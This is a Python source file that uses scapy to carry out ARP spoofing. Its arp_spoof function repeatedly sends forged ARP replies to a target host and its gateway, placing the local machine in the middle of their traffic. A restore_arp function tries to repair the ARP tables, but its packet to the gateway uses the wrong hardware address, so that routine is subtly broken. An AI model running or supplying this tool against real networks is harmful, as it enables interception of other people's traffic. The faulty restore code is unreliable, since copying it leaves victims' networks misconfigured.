from scapy.all import Ether, ARP, sendp, get_if_hwaddr
import time

def arp_spoof(target_ip, target_mac, gateway_ip, gateway_mac, interface, stop_event):
    """
    Redirect LAN traffic from the target to the local machine by sending fake ARP replies.
    """
    print(f"Starting ARP spoofing: Target {target_ip} <-> Gateway {gateway_ip}")
    try:
        attacker_mac = get_if_hwaddr(interface)
        pkt_to_target = Ether(dst=target_mac) / ARP(
            op=2, pdst=target_ip, psrc=gateway_ip, hwdst=target_mac, hwsrc=attacker_mac
        )

        pkt_to_gateway = Ether(dst=gateway_mac) / ARP(
            op=2, pdst=gateway_ip, psrc=target_ip, hwdst=gateway_mac, hwsrc=attacker_mac
        )

        while not stop_event.is_set():
            sendp(pkt_to_target, iface=interface, verbose=0)
            sendp(pkt_to_gateway, iface=interface, verbose=0)
            time.sleep(8)

    except Exception as e:
        print(f"Error during ARP spoofing: {e}")

def restore_arp(target_ip, target_mac, gateway_ip, gateway_mac, interface):
    """
    Sends correct ARP replies to restore the ARP tables of the target and gateway.
    """
    print("Restoring ARP tables to their original state...")
    pkt_to_target = Ether(dst=target_mac) / ARP(
        op=2, pdst=target_ip, psrc=gateway_ip, hwdst=target_mac, hwsrc=gateway_mac
    )

    pkt_to_gateway = Ether(dst=gateway_mac) / ARP(
        op=2, pdst=gateway_ip, psrc=target_ip, hwdst=target_mac, hwsrc=target_mac
    )
    
    sendp(pkt_to_target, iface=interface, count=5, verbose=0)
    sendp(pkt_to_gateway, iface=interface, count=5, verbose=0)
    print("ARP tables restored.")